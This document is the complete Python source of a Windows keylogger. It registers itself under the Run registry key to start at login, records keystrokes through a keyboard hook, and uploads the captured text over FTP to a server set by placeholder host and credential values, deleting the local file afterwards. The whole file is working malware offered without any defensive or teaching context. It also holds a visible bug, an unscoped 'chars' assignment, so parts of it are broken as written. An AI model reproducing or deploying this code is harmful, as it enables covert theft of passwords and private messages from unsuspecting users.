import keyboard as kb
import time
from datetime import datetime
import ftplib as ftp
import os
import sys
from winreg import *

chars = []

def add_to_startup():
    if getattr(sys, 'frozen', False):
	    fp = os.path.dirname(os.path.realpath(sys.executable))
    elif __file__:
	    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER,
    key_val, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "logger", 0, REG_SZ, new_file_path)

def send(filename):
    session = ftp.FTP('HOST','USERNAME','PASSWORD')
    session.cwd('FTP_PATH')
    file = open(filename,'rb')
    session.storbinary('STOR ' + str(datetime.now()), file)     
    file.close()
    session.quit()
    os.remove(filename)

def send_and_clear_cache():
    length = len(chars)
    if length > 150 and chars[length - 1] == ' ':
        filename = 'temp.dt'
        file = open(filename, 'w')
        file.write(''.join(chars))
        file.close()
        send(filename)
        chars = []

def log(event):
    global chars

    send_and_clear_cache()

    system_buttons = [
        'shift', 'enter',
        'ctrl', 'alt'
    ]

    char = event.name

    if char == 'backspace' and len(chars) > 1:
        chars.pop()
    elif char in system_buttons:
        pass
    else:
        if char == 'space':
            char = ' '
        if len(char) == 1:
            chars.append(char)

def main():
    add_to_startup()
    kb.on_release(log)  

    while True:
        time.sleep(0.1)
        pass

if __name__ == '__main__':
    main()
